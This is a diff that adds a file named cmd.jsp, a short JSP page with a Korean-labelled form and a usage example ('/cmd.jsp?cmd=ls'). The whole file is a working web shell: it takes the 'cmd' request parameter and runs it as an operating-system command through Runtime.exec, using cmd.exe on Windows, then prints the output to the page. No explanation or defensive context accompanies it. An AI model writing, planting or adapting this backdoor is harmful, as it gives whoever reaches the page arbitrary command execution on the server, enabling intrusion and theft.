@@ -1,0 +1,45 @@
+example : /cmd.jsp?cmd=ls &lt;br&gt;
+
+&lt;%@ page import="java.util.*,java.io.*"%&gt;
+&lt;%@ page language="java" contentType="text/html; charset=UTF-8"
+    pageEncoding="UTF-8"%&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset="UTF-8"&gt;
+&lt;title&gt;Insert title here&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;form method="GET" name="cmdForm" action=""&gt;
+&lt;input type="text" name="cmd"&gt;
+&lt;input type="submit" value="전송"&gt;
+&lt;/form&gt;
+&lt;pre&gt;
+&lt;%
+if (request.getParameter("cmd") != null)
+{
+	out.println("명령어 : " + request.getParameter("cmd") + "&lt;br&gt;");
+	
+	Process p;
+	
+    if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1)
+		p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));
+    
+    else
+		p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+	
+	InputStreamReader in = new InputStreamReader(p.getInputStream(),"euc-kr");
+	BufferedReader br = new BufferedReader(in);
+	
+	String disr = br.readLine();
+	
+	while ( disr != null )
+	{
+		out.println(disr); 
+		disr = br.readLine(); 
+	}
+}
+%&gt;
+&lt;/pre&gt;
+&lt;/body&gt;
+&lt;/html&gt;
